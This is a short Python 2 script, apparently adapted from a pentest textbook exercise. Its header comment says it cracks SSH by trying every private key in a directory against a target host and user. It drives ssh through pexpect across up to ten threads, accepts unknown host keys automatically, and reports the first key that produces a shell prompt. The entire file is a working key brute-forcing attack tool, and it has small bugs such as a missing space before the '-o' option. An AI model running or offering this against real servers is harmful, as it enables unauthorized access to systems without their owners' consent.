#!/usr/bin/env python
#encoding=utf-8
#使用pexpect遍历私钥 破解ssh by daige

import pexpect
import optparse
import os
from  threading  import *

maxConnections = 10
Stop = False
Fails = 0

connection_lock = BoundedSemaphore(value = maxConnections)

def connect(host,user,keyfile,release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        connStr = 'ssh ' + user +'@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)

        ret = child.expect([pexpect.TIMEOUT,perm_denied,ssh_newkey,conn_closed,'$','#',])
        if ret == 2:
            print '[-] Adding Host to ~/.ssh/known_hosts'
            child.sendline('yes')
            connect(host,user,keyfile,False)
        elif ret == 3:
            print '[-] Connection Closed By Remote Host'
            Fails += 1
        elif ret > 3:
            print '[+] Success. ' + str(keyfile)
            Stop = True
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -P <password list>')
    parser.add_option('-H',dest='host',type='string',help='specify target host')
    parser.add_option('-u',dest='user',type='string',help='specify the user')
    parser.add_option('-D',dest='keyDir',type='string',help='specify dir with keys')

    (options,args) = parser.parse_args()

    host = options.host
    user = options.user
    keyDir = options.keyDir

    if host == None or user == None or keyDir == None:
        print parser.usage
        exit(0)

    for filename in os.listdir(keyDir):
        if Stop:
            print '[*] Exiting: Key Found'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: Too Many Connections Closed By Remote Host'
            print '[!] Adjust number of simultaneous threads '
            exit(0)

        connection_lock.acquire()

        fullpath = os.path.join(keyDir,filename)
        print '[-] Testing keyfile ' + str(fullpath)

        t = Thread(target=connect,args=(host,user,fullpath,True))
        child=t.start()

if __name__ == '__main__':
    main()
